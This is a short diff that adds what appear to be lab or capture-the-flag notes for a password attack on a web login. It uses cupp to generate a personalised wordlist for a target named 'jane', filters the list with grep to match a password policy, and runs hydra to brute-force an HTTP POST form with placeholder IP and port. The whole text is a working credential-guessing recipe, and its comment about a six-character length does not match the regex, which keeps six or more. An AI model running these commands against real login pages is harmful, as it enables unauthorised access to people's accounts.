@@ -1,0 +1,8 @@
+# cupp
+cupp -i
+
+# password policy sets to a min of 6 characters. only filter for a pass length of 6 chars
+grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
+
+# attack using hydra
+hydra -L usernames.txt -P jane-filtered.txt IP -s PORT -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
